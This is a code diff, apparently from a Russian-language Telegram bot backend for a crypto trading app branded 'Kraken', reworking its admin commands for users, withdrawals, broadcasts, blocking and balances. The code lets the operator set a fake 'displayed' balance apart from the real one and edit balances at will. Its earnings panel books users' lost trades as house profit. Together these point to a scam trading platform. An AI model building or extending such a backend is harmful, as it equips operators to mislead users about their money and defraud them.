-                        await bot_send_message(chat_id, f"❌ <b>Вывод #{withdrawal_id} отменён!</b>\n\n💰 Сумма: {withdrawal.amount_rub:,.0f} ₽\n👤 Пользователь: {user_display}\n\n⚠️ ВАЖНО:\n• {refund_amount:.4f} USDT возвращены пользователю\n• Вам нужно ВРУЧНУЮ вернуть USDT пользователю через @CryptoBot\n• User ID: {user.telegram_id if user else 'N/A'}", parse_mode="HTML")
-                        
-                        # Уведомляем пользователя
-                        if user:
-                            try:
-                                await bot_send_message(int(user.telegram_id), f"❌ <b>Вывод отменён</b>\n\n💰 Запрошенная сумма: {withdrawal.amount_rub:,.0f} ₽\n📊 Статус: <b>Отменено</b>\n\n✅ {refund_amount:.4f} USDT возвращены на ваш баланс.", parse_mode="HTML")
-                            except: pass
-                    else:
-                        await bot_send_message(chat_id, "❌ Вывод не найден")
-            
-            # Handle contact user button
-            elif data.startswith("contact_user:"):
-                if str(chat_id) == str(ADMIN_ID):
-                    target_user_id = data.split(":",1)[1]
-                    admin_reply_state[str(ADMIN_ID)] = target_user_id
-                    await bot_send_message(chat_id, f"✅ Режим ответа включен для пользователя {target_user_id}\n\nОтправьте сообщение, которое хотите передать пользователю.\n\nДля отмены отправьте: /cancel")
-            
-            # Handle admin reply button
-            elif data.startswith("reply:"):
-                if str(chat_id) == str(ADMIN_ID):
-                    target_user_id = data.split(":",1)[1]
-                    admin_reply_state[str(ADMIN_ID)] = target_user_id
-                    await bot_send_message(chat_id, f"✅ Режим ответа включен для пользователя {target_user_id}\n\nОтправьте сообщение, которое хотите передать пользователю.\n\nДля отмены отправьте: /cancel")
         
         # Handle regular messages from admin
         elif "message" in update:
@@ -2757,33 +2491,33 @@ We'll respond as quickly as possible! ⚡"""
 
 Используй кнопки ниже для навигации 👇"""
                 
-                # Reply keyboard (persistent buttons under input field)
-                if str(chat_id) == str(ADMIN_ID):
-                    reply_kb = [
-                        [{"text": "🚀 Открыть приложение", "web_app": {"url": HOST_BASE}}],
-                        [{"text": "💰 Баланс"}, {"text": "👥 Рефералы"}],
-                        [{"text": "💬 Поддержка"}, {"text": "📊 История"}],
-                        [{"text": "🔐 Админ панель"}]
-                    ]
-                else:
-                    reply_kb = [
-                        [{"text": "🚀 Открыть приложение", "web_app": {"url": HOST_BASE}}],
-                        [{"text": "💰 Баланс"}, {"text": "👥 Рефералы"}],
-                        [{"text": "💬 Поддержка"}, {"text": "📊 История"}]
-                    ]
+                # Reply keyboard (persistent buttons under input field) - same for all users
+                reply_kb = [
+                    [{"text": "🚀 Открыть приложение", "web_app": {"url": HOST_BASE}}],
+                    [{"text": "💰 Баланс"}, {"text": "👥 Рефералы"}],
+                    [{"text": "💬 Поддержка"}, {"text": "📊 История"}]
+                ]
                 await bot_send_message(chat_id, welcome_text, reply_keyboard=reply_kb, parse_mode="HTML")
                 return {"ok": True}
             
-            # Handle /admin or /adminibot command - Admin panel
+            # Handle /admin or /adminibot command - Admin panel (text-based)
             elif (text == "/admin" or text == "/adminibot") and str(chat_id) == str(ADMIN_ID):
-                buttons = [
-                    [{"text": "📢 Сделать рассылку", "callback_data": "admin:broadcast_menu"}],
-                    [{"text": "✉️ Отправить сообщение пользователю", "callback_data": "admin:send_user_message"}],
-                    [{"text": "👥 Пользователи", "callback_data": "admin:users"}, {"text": "💸 Выводы", "callback_data": "admin:withdrawals"}],
-                    [{"text": "📊 Статистика", "callback_data": "admin:stats"}, {"text": "💰 Баланс", "callback_data": "admin:balance"}],
-                    [{"text": "🚪 Выйти из админки", "callback_data": "admin:exit"}]
-                ]
-                await bot_send_message(chat_id, "🔐 <b>Админ панель Kraken</b>\n\nВыберите раздел:", buttons, parse_mode="HTML")
+                admin_text = """🔐 <b>Админ панель Kraken</b>
+
+<b>Доступные команды:</b>
+/users - Список пользователей
+/withdrawals - Ожидающие выводы
+/stats - Статистика
+/broadcast MESSAGE - Рассылка всем
+/user ID - Информация о пользователе
+/verify ID - Верификация пользователя
+/premium ID - Premium статус
+/block ID ПРИЧИНА - Заблокировать пользователя
+/unblock ID - Разблокировать пользователя
+/addbalance ID СУММА - Добавить баланс
+/setbalance ID СУММА - Установить баланс
+/send_message ID MESSAGE - Сообщение пользователю"""
+                await bot_send_message(chat_id, admin_text, parse_mode="HTML")
                 return {"ok": True}
             
             # Handle /menu command - User main menu (same as /start but without referral check)
@@ -2793,19 +2527,12 @@ We'll respond as quickly as possible! ⚡"""
                     username = msg.get("from", {}).get("username")
                     user = await get_or_create_user(db, str(chat_id), username, "ru")
                 
-                if str(chat_id) == str(ADMIN_ID):
-                    reply_kb = [
-                        [{"text": "🚀 Открыть приложение", "web_app": {"url": HOST_BASE}}],
-                        [{"text": "💰 Баланс"}, {"text": "👥 Рефералы"}],
-                        [{"text": "💬 Поддержка"}, {"text": "📊 История"}],
-                        [{"text": "🔐 Админ панель"}]
-                    ]
-                else:
-                    reply_kb = [
-                        [{"text": "🚀 Открыть приложение", "web_app": {"url": HOST_BASE}}],
-                        [{"text": "💰 Баланс"}, {"text": "👥 Рефералы"}],
-                        [{"text": "💬 Поддержка"}, {"text": "📊 История"}]
-                    ]
+                # Reply keyboard (persistent buttons under input field) - same for all users
+                reply_kb = [
+                    [{"text": "🚀 Открыть приложение", "web_app": {"url": HOST_BASE}}],
+                    [{"text": "💰 Баланс"}, {"text": "👥 Рефералы"}],
+                    [{"text": "💬 Поддержка"}, {"text": "📊 История"}]
+                ]
                 await bot_send_message(chat_id, "🐙 <b>Главное меню Kraken</b>\n\nВыберите действие:", reply_keyboard=reply_kb, parse_mode="HTML")
                 return {"ok": True}
             
@@ -2914,16 +2641,6 @@ We'll respond as quickly as possible! ⚡"""
                 await bot_send_message(chat_id, msg_text, parse_mode="HTML")
                 return {"ok": True}
             
-            elif text == "🔐 Админ панель" and str(chat_id) == str(ADMIN_ID):
-                buttons = [
-                    [{"text": "📢 Сделать рассылку", "callback_data": "admin:broadcast_menu"}],
-                    [{"text": "✉️ Отправить сообщение пользователю", "callback_data": "admin:send_user_message"}],
-                    [{"text": "👥 Пользователи", "callback_data": "admin:users"}, {"text": "💸 Выводы", "callback_data": "admin:withdrawals"}],
-                    [{"text": "📊 Статистика", "callback_data": "admin:stats"}, {"text": "💰 Баланс", "callback_data": "admin:balance"}],
-                    [{"text": "🚪 Выйти из админки", "callback_data": "admin:exit"}]
-                ]
-                await bot_send_message(chat_id, "🔐 <b>Админ панель Kraken</b>\n\nВыберите раздел:", buttons, parse_mode="HTML")
-                return {"ok": True}
             
             # Handle /balance command - Set user REAL balance
             elif text.startswith("/balance ") and str(chat_id) == str(ADMIN_ID):
@@ -3079,6 +2796,233 @@ We'll respond as quickly as possible! ⚡"""
                     await bot_send_message(chat_id, f"❌ Ошибка: {str(e)}", parse_mode="HTML")
                 return {"ok": True}
             
+            # Handle /users command - List last 10 users with inline buttons
+            elif text == "/users" and str(chat_id) == str(ADMIN_ID):
+                users = (await db.execute(select(User).order_by(User.created_at.desc()).limit(10))).scalars().all()
+                msg = "👥 <b>Последние 10 пользователей:</b>\n\nВыберите пользователя для управления:"
+                
+                buttons = []
+                for u in users:
+                    block_icon = "🚫" if u.is_blocked else ""
+                    username_text = f"@{u.username}" if u.username else "Аноним"
+                    btn_text = f"👤 #{u.profile_id} {username_text} {block_icon}"
+                    buttons.append([{"text": btn_text, "callback_data": f"select_user:{u.profile_id}"}])
+                
+                await bot_send_message(chat_id, msg, buttons, parse_mode="HTML")
+                return {"ok": True}
+            
+            # Handle /withdrawals command - List pending withdrawals (text-based)
+            elif text == "/withdrawals" and str(chat_id) == str(ADMIN_ID):
+                withdrawals = (await db.execute(select(Withdrawal).where(Withdrawal.status.in_(["pending", "processing"])).order_by(Withdrawal.created_at.desc()).limit(10))).scalars().all()
+                
+                if not withdrawals:
+                    completed = (await db.execute(select(Withdrawal).where(Withdrawal.status == "completed").order_by(Withdrawal.created_at.desc()).limit(5))).scalars().all()
+                    msg = "💸 <b>Заявки на вывод</b>\n\n✅ Нет активных заявок\n\n"
+                    
+                    if completed:
+                        msg += "📜 <b>Последние выполненные:</b>\n"
+                        for w in completed:
+                            user = (await db.execute(select(User).where(User.id == w.user_id))).scalars().first()
+                            user_display = format_user_display(user)
+                            msg += f"✅ #{w.id} | {w.amount_rub:,.0f} ₽ | {user_display}\n"
+                else:
+                    msg = "💸 <b>Активные заявки на вывод</b>\n\n"
+                    total_pending_usdt = sum(w.usdt_required or 0 for w in withdrawals)
+                    total_pending_rub = sum(w.amount_rub for w in withdrawals)
+                    msg += f"💰 Общая сумма: {total_pending_usdt:.2f} USDT ({total_pending_rub:,.0f} ₽)\n"
+                    msg += f"📊 Заявок: {len(withdrawals)}\n\n"
+                    
+                    for w in withdrawals:
+                        user = (await db.execute(select(User).where(User.id == w.user_id))).scalars().first()
+                        user_display = format_user_display(user)
+                        status_icon = "🔴" if w.status == "pending" else "🟡"
+                        msg += f"{status_icon} #{w.id} - {w.usdt_required:.2f} USDT ({w.amount_rub:,.0f} ₽)\n"
+                        msg += f"   Карта: •••• {w.card_number or '****'} | {user_display}\n\n"
+                
+                await bot_send_message(chat_id, msg, parse_mode="HTML")
+                return {"ok": True}
+            
+            # Handle /stats command - Statistics (text-based)
+            elif text == "/stats" and str(chat_id) == str(ADMIN_ID):
+                total_users = (await db.execute(select(func.count(User.id)))).scalar() or 0
+                active_trades = (await db.execute(select(func.count(Trade.id)).where(Trade.status == "active"))).scalar() or 0
+                total_balance = (await db.execute(select(func.sum(User.balance_usdt)))).scalar() or 0.0
+                pending_withdrawals = (await db.execute(select(func.count(Withdrawal.id)).where(Withdrawal.status == "pending"))).scalar() or 0
+                
+                deposit_txs = (await db.execute(select(Transaction).where(Transaction.type == "deposit", Transaction.status == "done"))).scalars().all()
+                deposit_fees = sum(tx.amount * 0.05 for tx in deposit_txs)
+                total_deposits = sum(tx.amount for tx in deposit_txs)
+                
+                approved_withdrawals = (await db.execute(select(Withdrawal).where(Withdrawal.status == "approved"))).scalars().all()
+                withdrawal_fees = sum(w.usdt_required * 0.10 for w in approved_withdrawals if w.usdt_required)
+                total_withdrawals = sum(w.usdt_required or 0 for w in approved_withdrawals)
+                
+                exchange_txs = (await db.execute(select(Transaction).where(Transaction.type == "exchange", Transaction.status == "done"))).scalars().all()
+                exchange_fees = sum(abs(tx.amount) * 0.02 for tx in exchange_txs)
+                
+                all_trades_txs = (await db.execute(select(Transaction).where(Transaction.type == "trade"))).scalars().all()
+                trading_fees = sum(tx.details.get("fee", 0) for tx in all_trades_txs if tx.details and isinstance(tx.details, dict))
+                
+                lost_trades = (await db.execute(select(Trade).where(Trade.status == "completed", Trade.result == "loss"))).scalars().all()
+                trading_profit = sum(t.amount for t in lost_trades)
+                
+                won_trades = (await db.execute(select(Trade).where(Trade.status == "completed", Trade.result == "win"))).scalars().all()
+                trading_loss = sum(t.amount * 0.7 for t in won_trades)
+                
+                net_trading_profit = trading_profit - trading_loss
+                total_earnings = deposit_fees + withdrawal_fees + exchange_fees + trading_fees + net_trading_profit
+                
+                msg = f"💰 <b>Панель заработка</b>\n\n"
+                msg += f"💵 <b>ОБЩИЙ ДОХОД: {total_earnings:.2f} USDT</b>\n\n"
+                msg += f"📥 <b>Депозиты (5%):</b> {deposit_fees:.2f} USDT\n"
+                msg += f"   └ Всего депозитов: {total_deposits:.2f} USDT\n\n"
+                msg += f"📤 <b>Выводы (10%):</b> {withdrawal_fees:.2f} USDT\n"
+                msg += f"   └ Всего выведено: {total_withdrawals:.2f} USDT\n\n"
+                msg += f"🔄 <b>Обмены (2%):</b> {exchange_fees:.2f} USDT\n\n"
+                msg += f"💸 <b>Комиссия за торговлю (2%):</b> {trading_fees:.2f} USDT\n\n"
+                msg += f"📊 <b>Проигранные сделки:</b> {net_trading_profit:.2f} USDT\n"
+                msg += f"   ├ Проигранные: +{trading_profit:.2f}\n"
+                msg += f"   └ Выигранные: -{trading_loss:.2f}\n\n"
+                msg += f"━━━━━━━━━━━━━━━━\n"
+                msg += f"👥 Пользователей: {total_users}\n"
+                msg += f"📈 Активных сделок: {active_trades}\n"
+                msg += f"💰 Баланс пользователей: {total_balance:.2f} USDT\n"
+                msg += f"💸 Заявок на вывод: {pending_withdrawals}"
+                
+                await bot_send_message(chat_id, msg, parse_mode="HTML")
+                return {"ok": True}
+            
+            # Handle /verify command - Toggle verification status
+            elif text.startswith("/verify ") and str(chat_id) == str(ADMIN_ID):
+                try:
+                    parts = text.split()
+                    if len(parts) == 2:
+                        profile_id = int(parts[1])
+                        user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
+                        if user:
+                            user.is_verified = not user.is_verified
+                            await db.commit()
+                            status = "✅ Верифицирован" if user.is_verified else "❌ Не верифицирован"
+                            await bot_send_message(chat_id, f"👤 Пользователь #{profile_id}\nВерификация: {status}", parse_mode="HTML")
+                        else:
+                            await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден")
+                    else:
+                        await bot_send_message(chat_id, "❌ Используйте: /verify PROFILE_ID")
+                except Exception as e:
+                    await bot_send_message(chat_id, f"❌ Ошибка: {str(e)}")
+                return {"ok": True}
+            
+            # Handle /premium command - Toggle premium status
+            elif text.startswith("/premium ") and str(chat_id) == str(ADMIN_ID):
+                try:
+                    parts = text.split()
+                    if len(parts) == 2:
+                        profile_id = int(parts[1])
+                        user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
+                        if user:
+                            user.is_premium = not user.is_premium
+                            await db.commit()
+                            status = "⭐ Premium активен" if user.is_premium else "❌ Premium отключен"
+                            await bot_send_message(chat_id, f"👤 Пользователь #{profile_id}\n{status}", parse_mode="HTML")
+                        else:
+                            await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден")
+                    else:
+                        await bot_send_message(chat_id, "❌ Используйте: /premium PROFILE_ID")
+                except Exception as e:
+                    await bot_send_message(chat_id, f"❌ Ошибка: {str(e)}")
+                return {"ok": True}
+            
+            # Handle /block command - Block user
+            elif text.startswith("/block ") and str(chat_id) == str(ADMIN_ID):
+                parts = text.split(" ", 2)
+                if len(parts) < 2:
+                    await bot_send_message(chat_id, "❌ Использование: /block PROFILE_ID [ПРИЧИНА]")
+                    return {"ok": True}
+                try:
+                    profile_id = int(parts[1])
+                    reason = parts[2] if len(parts) > 2 else None
+                    user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
+                    if not user:
+                        await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден")
+                        return {"ok": True}
+                    user.is_blocked = True
+                    user.block_reason = reason
+                    await db.commit()
+                    reason_text = f"\nПричина: {reason}" if reason else ""
+                    await bot_send_message(chat_id, f"🚫 Пользователь #{profile_id} заблокирован{reason_text}")
+                    try:
+                        block_msg = "🚫 Ваш аккаунт заблокирован администратором."
+                        if reason:
+                            block_msg += f"\n\nПричина: {reason}"
+                        await bot_send_message(int(user.telegram_id), block_msg)
+                    except:
+                        pass
+                except ValueError:
+                    await bot_send_message(chat_id, "❌ ID должен быть числом")
+                return {"ok": True}
+            
+            # Handle /unblock command - Unblock user
+            elif text.startswith("/unblock ") and str(chat_id) == str(ADMIN_ID):
+                parts = text.split()
+                if len(parts) != 2:
+                    await bot_send_message(chat_id, "❌ Использование: /unblock PROFILE_ID")
+                    return {"ok": True}
+                try:
+                    profile_id = int(parts[1])
+                    user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
+                    if not user:
+                        await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден")
+                        return {"ok": True}
+                    user.is_blocked = False
+                    user.block_reason = None
+                    await db.commit()
+                    await bot_send_message(chat_id, f"✅ Пользователь #{profile_id} разблокирован")
+                    try:
+                        await bot_send_message(int(user.telegram_id), "✅ Ваш аккаунт разблокирован. Добро пожаловать!")
+                    except:
+                        pass
+                except ValueError:
+                    await bot_send_message(chat_id, "❌ ID должен быть числом")
+                return {"ok": True}
+            
+            # Handle /user command - Show user card (text-based, no buttons)
+            elif text.startswith("/user ") and str(chat_id) == str(ADMIN_ID):
+                try:
+                    parts = text.split()
+                    if len(parts) == 2:
+                        profile_id = int(parts[1])
+                        user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
+                        if user:
+                            verify_status = "✅" if user.is_verified else "❌"
+                            premium_status = "✅" if user.is_premium else "❌"
+                            block_status = "✅" if user.is_blocked else "❌"
+                            
+                            msg = f"👤 <b>Пользователь #{profile_id}</b>\n\n"
+                            msg += f"Telegram: {user.telegram_id}\n"
+                            msg += f"Username: @{user.username or 'N/A'}\n"
+                            msg += f"Баланс: {user.balance_usdt:.2f} USDT\n"
+                            msg += f"Верификация: {verify_status}\n"
+                            msg += f"Premium: {premium_status}\n"
+                            msg += f"🚫 Заблокирован: {block_status}\n"
+                            if user.is_blocked and user.block_reason:
+                                msg += f"Причина: {user.block_reason}\n"
+                            msg += f"\n<b>Команды:</b>\n"
+                            msg += f"/verify {profile_id} - переключить верификацию\n"
+                            msg += f"/premium {profile_id} - переключить Premium\n"
+                            msg += f"/block {profile_id} ПРИЧИНА - заблокировать\n"
+                            msg += f"/unblock {profile_id} - разблокировать\n"
+                            msg += f"/addbalance {profile_id} СУММА - добавить баланс\n"
+                            msg += f"/setbalance {profile_id} СУММА - установить баланс"
+                            
+                            await bot_send_message(chat_id, msg, parse_mode="HTML")
+                        else:
+                            await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден")
+                    else:
+                        await bot_send_message(chat_id, "❌ Используйте: /user PROFILE_ID")
+                except Exception as e:
+                    await bot_send_message(chat_id, f"❌ Ошибка: {str(e)}")
+                return {"ok": True}
+            
             # Handle /send_message command - Send message to specific user
             elif text.startswith("/send_message ") and str(chat_id) == str(ADMIN_ID):
                 try:
@@ -3124,32 +3068,32 @@ We'll respond as quickly as possible! ⚡"""
                     await bot_send_message(chat_id, f"❌ Ошибка: {str(e)}")
                 return {"ok": True}
             
-            # Handle /broadcast_all command - Send message to all users
-            elif text.startswith("/broadcast_all") and str(chat_id) == str(ADMIN_ID):
-                total_users = (await db.execute(select(func.count(User.id)))).scalar() or 0
-                buttons = [
-                    [{"text": "📱 В приложение", "callback_data": "broadcast:all:app_chat"}],
-                    [{"text": "💬 В Telegram бот", "callback_data": "broadcast:all:telegram_chat"}],
-                    [{"text": "❌ Отмена", "callback_data": "admin:menu"}]
-                ]
-                await bot_send_message(chat_id, f"📢 <b>Массовая рассылка всем</b>\n\n👥 Получателей: {total_users}\n\n🎯 Выберите канал доставки:", buttons, parse_mode="HTML")
-                return {"ok": True}
-            
-            # Handle /broadcast_limited command - Send message to limited number of users
-            elif text.startswith("/broadcast_limited ") and str(chat_id) == str(ADMIN_ID):
+            # Handle /broadcast command - Send message to all users (text-based)
+            elif text.startswith("/broadcast ") and str(chat_id) == str(ADMIN_ID):
                 try:
                     parts = text.split(maxsplit=1)
                     if len(parts) < 2:
-                        await bot_send_message(chat_id, "❌ Используйте: /broadcast_limited КОЛИЧЕСТВО")
+                        await bot_send_message(chat_id, "❌ Используйте: /broadcast ТЕКСТ_СООБЩЕНИЯ")
                         return {"ok": True}
                     
-                    count = int(parts[1])
-                    buttons = [
-                        [{"text": "📱 В приложение", "callback_data": f"broadcast:limited:{count}:app_chat"}],
-                        [{"text": "💬 В Telegram бот", "callback_data": f"broadcast:limited:{count}:telegram_chat"}],
-                        [{"text": "❌ Отмена", "callback_data": "admin:menu"}]
-                    ]
-                    await bot_send_message(chat_id, f"🎯 <b>Ограниченная рассылка</b>\n\n👥 Получателей: {count}\n\n🎯 Выберите канал доставки:", buttons, parse_mode="HTML")
+                    message_text = parts[1]
+                    users = (await db.execute(select(User))).scalars().all()
+                    sent_count = 0
+                    
+                    admin_msg = AdminMessage(user_id=None, message_text=message_text, is_broadcast=True, broadcast_count=0, delivery_type="telegram_chat")
+                    db.add(admin_msg)
+                    await db.flush()
+                    
+                    for user in users:
+                        try:
+                            await bot_send_message(int(user.telegram_id), f"📨 <b>Важное сообщение:</b>\n\n{message_text}", parse_mode="HTML")
+                            sent_count += 1
+                        except:
+                            pass
+                    
+                    admin_msg.broadcast_count = sent_count
+                    await db.commit()
+                    await bot_send_message(chat_id, f"✅ <b>Рассылка завершена!</b>\n\n📤 Отправлено: {sent_count}/{len(users)}", parse_mode="HTML")
                 except Exception as e:
                     await bot_send_message(chat_id, f"❌ Ошибка: {str(e)}")
                 return {"ok": True}
@@ -3171,81 +3115,35 @@ We'll respond as quickly as possible! ⚡"""
                     await bot_send_message(chat_id, f"❌ Ошибка: {str(e)}")
                 return {"ok": True}
             
-            # Check if admin is in balance management mode
+            # Check if admin is in balance management mode (legacy - buttons removed)
             elif str(chat_id) == str(ADMIN_ID) and str(ADMIN_ID) in admin_balance_state:
                 if text == "/cancel":
                     del admin_balance_state[str(ADMIN_ID)]
-                    await bot_send_message(chat_id, "❌ Отменено", [[{"text": "🔙 Главное меню", "callback_data": "admin:menu"}]])
+                    await bot_send_message(chat_id, "❌ Отменено. Используйте /admin для доступа к командам.")
                     return {"ok": True}
                 
                 state = admin_balance_state[str(ADMIN_ID)]
                 action = state.get("action")
-                
-                # Handle profile ID input
-                if action == "select_user":
-                    try:
-                        profile_id = int(text)
-                        user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
-                        if user:
-                            # Show user menu
-                            real_bal = user.balance_usdt or 0.0
-                            display_bal = user.display_balance_usdt if user.display_balance_usdt is not None else real_bal
-                            user_info = format_user_info(user)
-                            response_text = f"👤 <b>Пользователь: {user_info}</b>\n"
-                            response_text += f"💰 Реальный баланс: {real_bal:.2f} USDT\n"
-                            response_text += f"🎭 Отображаемый: {display_bal:.2f} USDT\n\n"
-                            response_text += "Выберите действие:"
-                            
-                            buttons = [
-                                [{"text": "➕ Пополнить", "callback_data": f"admin:balance:add:{profile_id}"}],
-                                [{"text": "➖ Списать", "callback_data": f"admin:balance:subtract:{profile_id}"}],
-                                [{"text": "✏️ Установить точную сумму", "callback_data": f"admin:balance:set:{profile_id}"}],
-                                [{"text": "🎭 Изменить отображаемый", "callback_data": f"admin:balance:display:{profile_id}"}],
-                                [{"text": "🔙 Назад", "callback_data": "admin:balance"}]
-                            ]
-                            admin_balance_state[str(ADMIN_ID)] = {"action": "select_action", "profile_id": profile_id}
-                            await bot_send_message(chat_id, response_text, buttons, parse_mode="HTML")
-                        else:
-                            await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден\n\nПопробуйте другой ID:", parse_mode="HTML")
-                    except ValueError:
-                        await bot_send_message(chat_id, "❌ Введите корректный Profile ID (число):", parse_mode="HTML")
-                    return {"ok": True}
-                
-                # Handle amount inputs
                 profile_id = state.get("profile_id")
+                
                 if profile_id:
                     try:
                         amount = float(text)
                         
                         if action == "input_add_amount":
                             result = await execute_balance_change(db, profile_id, amount, "add", chat_id)
-                            if result["ok"]:
-                                buttons = [[{"text": "💰 Другая операция", "callback_data": f"admin:balance:user:{profile_id}"}],
-                                          [{"text": "🔙 Главное меню", "callback_data": "admin:menu"}]]
-                                await bot_send_message(chat_id, result["message"], buttons, parse_mode="HTML")
-                                del admin_balance_state[str(ADMIN_ID)]
-                            else:
-                                await bot_send_message(chat_id, result["message"], parse_mode="HTML")
+                            await bot_send_message(chat_id, result["message"], parse_mode="HTML")
+                            del admin_balance_state[str(ADMIN_ID)]
                         
                         elif action == "input_sub_amount":
                             result = await execute_balance_change(db, profile_id, -amount, "add", chat_id)
-                            if result["ok"]:
-                                buttons = [[{"text": "💰 Другая операция", "callback_data": f"admin:balance:user:{profile_id}"}],
-                                          [{"text": "🔙 Главное меню", "callback_data": "admin:menu"}]]
-                                await bot_send_message(chat_id, result["message"], buttons, parse_mode="HTML")
-                                del admin_balance_state[str(ADMIN_ID)]
-                            else:
-                                await bot_send_message(chat_id, result["message"], parse_mode="HTML")
+                            await bot_send_message(chat_id, result["message"], parse_mode="HTML")
+                            del admin_balance_state[str(ADMIN_ID)]
                         
                         elif action == "input_set_amount":
                             result = await execute_balance_change(db, profile_id, amount, "set", chat_id)
-                            if result["ok"]:
-                                buttons = [[{"text": "💰 Другая операция", "callback_data": f"admin:balance:user:{profile_id}"}],
-                                          [{"text": "🔙 Главное меню", "callback_data": "admin:menu"}]]
-                                await bot_send_message(chat_id, result["message"], buttons, parse_mode="HTML")
-                                del admin_balance_state[str(ADMIN_ID)]
-                            else:
-                                await bot_send_message(chat_id, result["message"], parse_mode="HTML")
+                            await bot_send_message(chat_id, result["message"], parse_mode="HTML")
+                            del admin_balance_state[str(ADMIN_ID)]
                         
                         elif action == "input_display_amount":
                             user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
@@ -3256,10 +3154,7 @@ We'll respond as quickly as possible! ⚡"""
                                 message += f"🆔 Profile ID: #{profile_id}\n"
                                 message += f"🎭 Новый отображаемый: {amount:.2f} USDT\n"
                                 message += f"💎 Реальный баланс: {user.balance_usdt:.2f} USDT"
-                                
-                                buttons = [[{"text": "💰 Другая операция", "callback_data": f"admin:balance:user:{profile_id}"}],
-                                          [{"text": "🔙 Главное меню", "callback_data": "admin:menu"}]]
-                                await bot_send_message(chat_id, message, buttons, parse_mode="HTML")
+                                await bot_send_message(chat_id, message, parse_mode="HTML")
                                 del admin_balance_state[str(ADMIN_ID)]
                             else:
                                 await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден", parse_mode="HTML")
